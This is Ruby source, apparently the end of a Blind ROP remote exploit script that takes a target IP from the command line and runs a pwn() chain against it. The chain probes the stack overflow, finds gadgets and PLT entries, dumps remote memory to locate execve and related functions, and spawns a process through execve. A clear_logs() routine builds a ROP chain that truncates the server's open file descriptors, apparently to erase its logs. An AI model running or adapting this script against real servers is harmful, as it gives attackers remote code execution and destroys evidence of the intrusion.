			got_sym(symno, symname)

#			symno += 1 if type == 2
#			# XXX
#			symno += 1 if symname == "__gmon_start__" 

			symno += 1

			if val > 0x500000
				$writable = val
				print("Writable at #{$writable.to_s(16)}\n")
			end
		end

		idx += symlen
	end

	read_rel(addr, symtab)
end

def find_rel(prog)
	check = 3
	for i in 0..(prog.length-1)
		rem = prog.length - i

		break if rem < (24 * check)

		good = true

		for j in 0..(check - 1)
			idx = i + j * 24

			type = prog[idx..(idx + 3)].unpack("L<")[0]
			
			if type != 7
				good = false
				break
			end

			val = prog[(idx+8)..(idx + 8 + 7)].unpack("Q")[0]

			if val != 0
				good = false
				break
			end
		end

		return i if good
	end

	return -1
end

def read_rel(addr, symtab)
	start = addr

	print("Reading rel\n")
	prog = ""
	idx = 0

	while true
		print("Reading #{addr.to_s(16)}\r")
		x = dump_addr(addr)

		abort("sdf") if x.length == 0

		prog += x
		addr += x.length

		idx = find_rel(prog)

		break if idx >= 0
	end

	abort("sdfsdf") if idx < 8

	idx -= 8

	print("Found REL at #{(idx + start).to_s(16)}\n")

	slot = 0

	need = [ "read", "usleep", "execve", "ftruncate64", "exit" ]

	while true
		while prog.length - idx < 24
			print("Reading #{addr.to_s(16)}\r")
			x = dump_addr(addr);

			abort("sdfsdF") if x.length == 0

			prog += x
			addr += x.length
		end

		type = prog[(idx + 8)..(idx + 8 + 3)].unpack("L<")[0]

		abort("ddddd") if type != 0x7

		num = prog[(idx + 8 + 4)..(idx + 8 + 4 + 3)].unpack("L<")[0]

		abort("sdfasdf") if num >= symtab.length

		name = symtab[num]

		print("Slot #{slot} num #{num} #{name}\n")

		if need.include?(name)
			print("Found #{name} at #{slot}\n")
			eval("$#{name} = #{slot}")
			need.delete(name)

			break if need.empty?
		end

		idx += 24
		slot += 1
	end
end

def do_aslr()
	print("Assuming ASLR\n")
	stack_read()
	find_plt_depth()
end

def clear_logs()
	$url = "/dsafaasl"

	rop = []

	fds = 0..15

	ftruncate = $ftruncate64
	exitt = $exit

	for f in fds
		rop << $rdi
		rop << f

		rop << $rdi - 2
		rop << 0
		rop << 0

		rop << ($plt + 0xb)
		rop << ftruncate
	end

	rop << $rdi
	rop << 0

	rop << ($plt + 0xb)
	rop << exitt

	rop << $death

	rc = try_exp(rop)

	print("Cleared\n")
end

def pwn()
	print("Pwning\n")
	print_progress()

	check_vuln() if not $overflow_len
	check_overflow_len() if not $overflow_len
	print_progress()

	$sport = true

	find_plt_depth() if not $plt
	print_progress()

#	stack_read()

	do_aslr() if not $plt
	print_progress()

#	check_vsyscall() if not $vsyscall_mode
#	determine_target()
#	check_stack_depth() if not $depth
#	check_pad() if $pad == 0
#	find_plt() if not $plt
#	print_progress()

#	find_pops() if not $rax or not $syscall
#	find_pops() if not $rdi
	find_gadget() if not $rdi
	print_progress()

	find_rdx() if not $strcmp
	print_progress()

#	find_write() if not $write
	find_write2() if not $write
	print_progress()
#	find_rdi() if not $rdi
#	find_rsi() if not $rsi

#	find_fd()

	find_dup() if not $dup

	print_progress()

	read_sym() if not $read

	find_read() if not $read

	print_progress()

	find_good_rdx() if not $goodrdx

	find_execve() if not $execve

	do_execve()
#	dump_bin()
#	clear_logs()
#	exp()

	print_progress()
end

def do_state(save, silent = false)
	vars = [ "pad", "ret", "overflow_len", "depth", "syscall", "pos",
		 "pops", "rax", "rdi", "rsi", "vsyscall_mode", "canary",
		 "canary_offset", "plt", "write", "to", "strcmp", "dup",
		 "read", "execve", "goodrdx", "aslr", "writable", "usleep",
		 "ftruncate64", "exit" ]

	state = {}

	for v in vars
		state[v] = eval("$#{v}")
	end

	if save
	        x = Marshal.dump(state)
        	File.open("state.bin", "w") { |file| file.write(x) }
	else
		begin
			File.open("state.bin", "r") { |file|
				print("Reading state\n")
				x = file.read                                                                          
				state = Marshal.load(x)                                                               
			}
		rescue
			return
		end
	end

	for v in vars
		next if not state[v]
		eval("$#{v} = #{state[v]}")
		print("Setting #{v} to #{state[v]}\n") if not silent
	end
end

def load_state()
	do_state(false)
end

def save_state(silent = false)
	do_state(true, silent)
end

def test()
	load_state()

	$pad = 0
	$depth = 0
	$overflow_len = 4192

	rop = Array.new(3) { |j| 0x400000 }
	try_exp(rop)

# unlink changes rdx ; qsort interesting
# strncmp

	rop = []
	r   = 0x402da1
	plt = 0x402490

	plt += 0x10 * 10

	plt = 0x000000000402860

	for i in 0..5
		plt += 0x10 * i

		print("Doing 0x#{plt.to_s(16)}\n")

		rop << $rdi
		rop << 0x400000

		rop << $rdi - 2
		rop << 0x400000
		rop << 0

		rop << plt
		rop << r
	end

	rc = try_exp(rop)
	print("RC IS #{rc}\n")

	exit(1)
end

def main()
#	test()

	begin
		load_state()

		if ARGV.length > 1
			exp()
		elsif ARGV.length == 1
			$ip = ARGV[0]
			print("Pwning IP #{$ip}\n")
		end
		pwn()
		save_state()
	rescue Interrupt => e
		print("\nInterrupt\n")
		puts e.backtrace
		save_state()
	end
end

main()
